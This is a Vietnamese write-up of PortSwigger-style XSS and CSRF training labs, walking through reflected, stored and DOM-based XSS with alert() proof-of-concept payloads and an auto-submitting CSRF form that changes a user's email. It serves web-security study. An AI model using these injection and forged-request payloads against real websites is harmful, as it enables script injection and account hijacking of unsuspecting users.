# Write Up exercise XSS_CSRF 

## Lab: Reflected XSS into HTML context with nothing encoded

![Image](https://github.com/user-attachments/assets/517fee09-f1f8-4a69-ac20-2bacc36418fe)

Đầu tiên khi vào website ta sẽ thấy 1 ô search box 

![Image](https://github.com/user-attachments/assets/f95930ac-50fd-4d74-9740-30654740ba3f)

Ta sẽ thử sử dụng và thấy rằng khi search bất cứ từ khóa gì thì sẽ được gán vào parameter ```search```

![Image](https://github.com/user-attachments/assets/a319447b-4260-450d-ac47-a3949512b9b9)

Ta sẽ thử dùng lệnh alert ở đây

![Image](https://github.com/user-attachments/assets/66831f92-f45f-4159-83c6-7444fdfcf3fb)


![image](https://github.com/user-attachments/assets/e655f90d-5fc5-438f-bb4e-0bf2b7f7f343)

## Lab: Stored XSS into HTML context with nothing encoded

![Image](https://github.com/user-attachments/assets/d1f6e4de-1486-437a-a2d9-d810644acbc0)

Ở lab này ta sẽ không còn search box mà thay vào đó là chức năng view post

![Image](https://github.com/user-attachments/assets/a31b7827-a5a6-4341-9c1f-11432b07cde2)

Ta thấy parameter postId, thử inject vào đây 
![Image](https://github.com/user-attachments/assets/cf2fe8bb-32aa-43e8-a01d-4522180848f5)

Kết quả là không được ta tiếp tục tìm kiếm nơi để inject code
![Image](https://github.com/user-attachments/assets/57bf9a90-9735-45bd-b8e8-1c0be029cade)

Ở bên dưới của post ta thấy chỗ để comment ta sẽ thử inject vào trường đầu tiên xem thế nào

![Image](https://github.com/user-attachments/assets/f1292234-62f2-46a5-b926-8960ba601d9d)

Sau khi post comment ta sẽ được đưa đến trang này

![Image](https://github.com/user-attachments/assets/3fd7e3e5-1f73-4854-a82f-c2131e0d7d99)

Vì đây là Store XSS nên ta thử quay lại trang comment xem như nào

![Image](https://github.com/user-attachments/assets/3fd7e3e5-1f73-4854-a82f-c2131e0d7d99)

=> Mỗi lần load lại trang có postId=9 sẽ bị alert

## Lab: DOM XSS in ```document.write``` sink using source ```location.search```

![image](https://github.com/user-attachments/assets/f8fc5df8-34bd-4241-9e91-7a9c0293033f)

Ở lab này vẫn có search box ta thử inject code vào đây và challenge này có liên quan đến DOM nên ta sẽ xem qua code

![image](https://github.com/user-attachments/assets/e7f0f065-0ca1-4d2c-9073-28af6bf35a00)

![image](https://github.com/user-attachments/assets/53333244-7da1-4126-a7a0-c5935ccbcb14)

Sau khi xem qua thì ta thấy được code được inject ở 2 nơi tuy nhiên không gây ra bất cứ tác động gì

Giả sử ta search 1 thì img tag sẽ như này ```<img src="/resources/images/tracker.gif?searchTerms=1">```

Bây giờ ta sẽ cố gắng escape ra khỏi attribute src của tag img, bằng cách thêm dấu ```"```: ```<img src="/resources/images/tracker.gif?searchTerms=">```

Sau đó ta sẽ inject code vào, thường thì ta sẽ thêm event ```onerror``` nhưng ở đây ta không load ra bất cứ ảnh gì nếu search sai<br> 
=> dùng một event khác của tag img<br>

![image](https://github.com/user-attachments/assets/c023e507-d078-4c6a-9a86-5d039f4067ef)

Ở đây ta thấy event ```onload``` là phù hợp nhất:```<img src="/resources/images/tracker.gif?searchTerms=" onload="alert(1)>"```<br>

Do còn dư 1 dấu ```"``` của tag img khi ta cố escape nên payload của ta sẽ trở thành: ```" onload="alert(1)``` <br>

![image](https://github.com/user-attachments/assets/5009cc24-1ba3-4865-852a-e7a1380f23ce)

![image](https://github.com/user-attachments/assets/88131e12-5162-42ad-8e48-f12375b081cc)

![image](https://github.com/user-attachments/assets/87741055-822d-43c0-9561-e6b446e33c93)


Reference:
```text
https://www.html.am/tags/html-img-tag.cfm
```


## Lab: DOM XSS in ```innerHTML``` sink using source ```location.search```


![image](https://github.com/user-attachments/assets/d5871558-b4af-4d71-8260-297fcfcafd0d)

Challenge này khá giống với challenge trước, mình đã thử inject tag script ```<script>alert(1)</script>``` vào search box, tuy nhiên code không chạy

![image](https://github.com/user-attachments/assets/09729118-a4f2-4368-8ccd-395e2c9d1b2b)

Bởi vì tag ```span``` thì có khá tương đồng với ```div``` mặc dù có một số khác biệt, tức là nó có thể thực thi một số tag bên trong nó

Vì vậy mình sẽ thử dùng tag img ```<img src=x onerror=alert(1)>```

![image](https://github.com/user-attachments/assets/17ce9bed-319d-41eb-8cca-33cb1e9c1343)

## Lab: DOM XSS in jQuery anchor ```href``` attribute sink using ```location.search``` source


![image](https://github.com/user-attachments/assets/4ace5cb0-cee5-43cc-acc4-838b21d15a0f)

Trong challenge này đề bài yêu cầu ta chú ý vào ```href``` khi vào lab thì ta thấy có chức năng submit feedback

![image](https://github.com/user-attachments/assets/141c74af-e515-4026-a5df-ce281427f26e)

Mình đã thử tìm kiếm tag ```href``` trong web này chỉ duy nhất ở vị trí này là có thể thay đổi tùy ý được

![image](https://github.com/user-attachments/assets/9b5fad7e-5acb-4dc6-b4ec-e7d30e37a965)

Sau đó mình đã tìm cách để chạy javascript trong tag ```href```

![image](https://github.com/user-attachments/assets/183bf26f-3d15-49ed-93da-13791a0c9922)

Và thử 

![image](https://github.com/user-attachments/assets/ecabfd41-0210-4384-8421-4ed96b6056d6)



Reference:
```text
https://flaviocopes.com/links-for-javascript/


## 
```

## Lab: DOM XSS in jQuery selector sink using a hashchange event

![image](https://github.com/user-attachments/assets/f110de62-0db5-4bd8-b61e-99ddb0af7dfd)

Lỗi của bài này nằm ở hashchange event trong jquery nên ta sẽ tìm đoạn code có chứa event này

![image](https://github.com/user-attachments/assets/39888c19-3359-46db-b072-b4f75c44b523)

Đoạn code này có tác dụng

```javascript

$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
                    
```

Khi sự kiện hashchange được kích hoạt sẽ tìm kiếm phần tử ```<h2>``` nằm trong phần ```<section>``` với class CSS là ```'blog-list'```, và có nội dung chứa chuỗi giá trị sau khi giải mã từ phần đoạn hash trong URL.<br>

Sau khi tìm thấy nó sẽ kiểm tra điều kiện sau đó dùng chức năng auto scroll của hàm scrollIntoView<br>

Tuy nhiên lỗi xảy ra ở if bởi vì trong jquery, một đối tượng trả về không bao giờ sai ở dạng boolean</br>

Nói cho dễ hiểu là sau dấu # là tên của một post nào đó thì nó sẽ auto chạy tới post đó<br>

![image](https://github.com/user-attachments/assets/a39c0274-a170-42c4-99bf-65735543efcf)

Vì vậy mình sẽ thử inject code đơn giản

![image](https://github.com/user-attachments/assets/5c070ee5-cd97-49fc-bd26-7bb69cc29185)

Điều này chứng minh bất cứ thứ gì được inject sau dâu ```#``` sẽ được thực thi, nhưng nếu ta muốn thực hiện ```zero-click``` <br>

thì ta sẽ phải ép web chạy script bằng cách dùng ```iframe```, gửi một request có body là ```iframe``` đến web và gán giá trị ép web phải load

![image](https://github.com/user-attachments/assets/3d3533f6-bf40-4368-958e-5b1c8cbabc25)

Ở payload này ta sẽ lấy trang web bị lỗi cộng chuỗi với tag img kèm với lệnh print vì vậy payload sẽ giống như lúc nãy ta thử inject ở trên

![image](https://github.com/user-attachments/assets/e250bd55-4ff4-4e92-96e6-eea846f5961d)


## Lab: Reflected XSS into attribute with angle brackets HTML-encoded

![image](https://github.com/user-attachments/assets/bc8099e9-5233-491e-8fa3-e35e0cc38489)

Ở challenge này ta nhận ra bất cứ gì ta type vào search box cx đều sẽ đưa vào tag ```input```


```html
<input type="text" placeholder="Search the blog..." name="search" value="hello">
```
Thêm đó ta biết được rằng tag ```input``` cũng có các event như ```img```<br>

Vì vậy payload của ta sẽ như sau: ```"onmouseover="alert(1)```<br>
Lúc này tag input sẽ trở thành: ```<input type="text" placeholder="Search the blog..." name="search" value=""onmouseover="alert(1)">```

![image](https://github.com/user-attachments/assets/1b4ba3da-c53a-45f7-bf15-0767543ebfcb)

reference:
```text
https://www.html.am/tags/html-input-tag.cfm
```

## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

![image](https://github.com/user-attachments/assets/43cbe101-70f5-40b6-9f42-db253bcda554)

Web này có chức năng comment vậy ta sẽ xem thử chức năng này hoạt động thế nào

![image](https://github.com/user-attachments/assets/634ea985-a19f-4121-a26e-c7c85fdda58c)

Sau đó ta nhận ra là chức năng comment của lưu website của comment trong tag ```a```, vì vậy khi ấn vào sẽ được thực thi</br>

Ta còn biết thêm nêu muốn thực thi javascript trong attribute ```href```: ```javascript:alert(1)```

![image](https://github.com/user-attachments/assets/071e4e31-29e8-429c-95bc-98a6c6d4d5f0)

![image](https://github.com/user-attachments/assets/8c420099-9548-49dc-89db-6bffc5a1130b)

![image](https://github.com/user-attachments/assets/fdc82a5c-3c3b-4d1b-84ba-ec7734a459e9)

## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

![image](https://github.com/user-attachments/assets/b9fa2d3f-5c8b-4b90-b4c8-31f7801ccbd9)

Challenge này bất cứ từ gì có chữ ```script``` đều bị encode

![image](https://github.com/user-attachments/assets/6cc3f700-4bda-41ec-9056-83fb1b713846)

Giả sử ta search 1 input bình thường, ta thấy rằng input là một biến trong đoạn code javascript

![image](https://github.com/user-attachments/assets/d82afdf0-e550-4b4a-b3e2-c9cb0c9a6142)

```javascript

var searchTerms = 'test';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    
```

Ta sẽ escape ra khỏi biến và thực thi thẳng code javascript chứ không cần tag script nữa<br>
Payload lúc này sẽ như sau: ```';alert(1);//```

![image](https://github.com/user-attachments/assets/104aab79-66d4-4d0a-9b66-1a067c256d63)

![image](https://github.com/user-attachments/assets/1c1945a3-50db-4cb8-9d08-ea9c18681612)


## Lab: CSRF vulnerability with no defenses

![image](https://github.com/user-attachments/assets/857f3038-550c-485b-96bf-c14282de67d0)

Trong challenge này mục tiêu là ép người dùng thực hiện hành động không mong muốn<br>
và trong challenge này thì trong web có 1 hành động là update email

![image](https://github.com/user-attachments/assets/27e0a920-f24f-4123-917a-041f64655c88)

Đây là form email lấy được từ source code
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <button class="button" type="submit"> Update email </button>
</form>
```

Ta sẽ chỉnh sửa một chút để có thể gửi request tới website:<br> 
- Sửa action không còn là đường dẫn mà là URL đến chức năng update email
- Sửa form submit 

Sửa code html này để khi gửi dùng ấn vào chức năng sửa email không phải form của web thật hiện ra mà là form của attacker

```html
<html>
  <body>
    <form action="https://0a5f00de04b921f4826ac5ca0051000c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="changed&#64;changed&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

![image](https://github.com/user-attachments/assets/8cc76171-2f87-45f7-a351-b8d269ed814a)

Sau khi dùng exploit server để gửi thì bây giờ email của người dùng đã được đổi thành email ta muốn

![image](https://github.com/user-attachments/assets/1c3424e8-5234-4d74-824d-488711c2660b)
























